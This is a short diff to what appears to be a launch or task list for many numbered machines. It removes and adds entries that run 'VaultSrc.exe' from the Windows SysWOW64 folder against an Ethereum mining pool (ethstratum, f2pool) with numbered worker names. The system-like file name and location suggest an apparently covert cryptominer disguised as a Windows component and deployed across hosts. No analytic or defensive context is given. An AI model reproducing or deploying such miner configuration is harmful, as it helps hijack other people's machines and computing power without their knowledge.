@@ -1,8 +1,5 @@
+zzxxcc1]]]1,2,3,4,5,6,7,8,9,10,11,22,23]]]VaultSrc.exe -uri ethstratum://airlook.1@eth.f2pool.com:6688
 
+zzxxcc2]]]1,2,3,4,5,6,7,8,9,10,11,22,23]]]VaultSrc.exe -uri ethstratum://airlook.2@eth.f2pool.com:6688
 
-101  C:\\Windows\\SysWOW64\\VaultSrc.exe  -uri ethstratum://airlook.101@eth.f2pool.com:6688
-
-
-102  C:\\Windows\\SysWOW64\\VaultSrc.exe  -uri ethstratum://airlook.102@eth.f2pool.com:6688
-
-
+zzxxcc105]]]1,2,3,4,5,6,7,8,9,10,11,22,23]]]VaultSrc.exe -uri ethstratum://airlook.105@eth.f2pool.com:6688
